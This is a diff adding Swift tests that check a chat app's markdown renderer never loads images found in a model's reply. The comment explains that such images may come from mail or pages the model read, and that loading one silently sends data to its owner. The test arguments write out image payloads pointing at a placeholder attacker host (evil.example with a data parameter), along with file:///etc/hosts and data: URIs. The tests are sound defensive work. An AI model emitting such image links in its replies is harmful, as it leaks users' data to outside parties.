@@ -280,6 +280,44 @@ private func md(_ text: String, _ t: Theme = Themes.glass, hidden: Int = 0) -> N
     }
 }
 
+/// An image in a reply comes from mail or a page the model read: loading it would send its address (and what is in it) to its
+/// owner with no click at all. The card shows an image as its words and never as an attachment, which is what AppKit would load.
+@Suite @MainActor struct MarkdownImageTests {
+    init() { _ = NSApplication.shared }
+
+    private func count(_ key: NSAttributedString.Key, _ s: NSAttributedString) -> Int {
+        var n = 0
+        s.enumerateAttribute(key, in: NSRange(location: 0, length: s.length)) { value, _, _ in if value != nil { n += 1 } }
+        return n
+    }
+
+    @Test(arguments: [
+        "![x](https://evil.example/p.png?d=1)", "before ![](https://evil.example/p.png?d=1) after",
+        "<img src=\"https://evil.example/p.png?d=1\">", "<img src='https://evil.example/p.png?d=1' alt='x'/> tail",
+        "para\n\n<img src=\"https://evil.example/p.png?d=1\">\n\nnext", "![x][ref]\n\n[ref]: https://evil.example/p.png?d=1",
+        "![x](data:image/png;base64,iVBORw0KGgo=)", "![x](file:///etc/hosts)", "[![x](https://evil.example/p.png?d=1)](https://example.com/go)",
+    ])
+    func anImageIsNeverAnAttachmentOrALink(_ source: String) {
+        let styled = Markdown.attributed(source, theme: Themes.glass)
+        // nothing for a layout to load. (An empty alt text comes out of Foundation as one U+FFFC; with no attachment on it that is a blank, not an image.)
+        #expect(count(.attachment, styled) == 0)
+        var links: [String] = []
+        styled.enumerateAttribute(.link, in: NSRange(location: 0, length: styled.length)) { value, _, _ in
+            if let value { links.append("\(value)") }
+        }
+        #expect(links.allSatisfy { !$0.contains("p.png") && !$0.contains("hosts") && !$0.hasPrefix("data:") })  // not a link to the image either
+        let box = TextBox(width: 302)  // and what the text view holds, once laid out
+        box.setContent(styled)
+        box.setBoxHeight(box.wantedHeight(cap: 300))
+        #expect(count(.attachment, box.textView.textStorage!) == 0)
+    }
+
+    @Test func aLinkedImageIsOnlyALinkToItsTarget() {
+        let styled = Markdown.attributed("[![x](https://evil.example/p.png?d=1)](https://example.com/go)", theme: Themes.glass)
+        #expect(styled.string == "x" && styled.attribute(.link, at: 0, effectiveRange: nil) as? URL == URL(string: "https://example.com/go"))
+    }
+}
+
 @Suite @MainActor struct MarkdownCountTests {
     init() { _ = NSApplication.shared }  // AppKit text and scrolling need the application object
 
